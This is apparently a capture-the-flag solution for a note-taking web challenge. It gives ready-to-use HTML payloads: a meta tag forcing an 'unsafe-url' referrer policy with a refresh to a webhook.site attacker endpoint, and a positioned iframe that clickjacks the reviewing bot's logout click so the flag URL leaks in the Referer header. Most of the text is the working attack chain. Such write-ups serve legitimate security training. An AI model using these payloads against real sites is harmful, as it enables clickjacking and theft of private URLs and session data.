# Solution


Create one note that:
- Set the referrer policy to `unsafe-url`
- Redirect to the attacker server after 3 seconds

```
<meta name="referrer" content="unsafe-url" />
<meta http-equiv="refresh" content="3;url=https://webhook.site/d485f13a-fd8b-4cfd-ad13-63d9b0f1f5ef" />
```


Create another note that embeds the first one in the right position so that the bot click on the logout button causes the iframe to navigate to `/last`
```
<iframe src="/document/f15df777-f0fb-44bc-a83f-58691ae9c176" style="z-index:2; position:absolute; top:0px; right:-120px; height:100px">
</iframe>
```

By reporting the second note the bot will visit the attacker server, leaking the flag url in the referrer header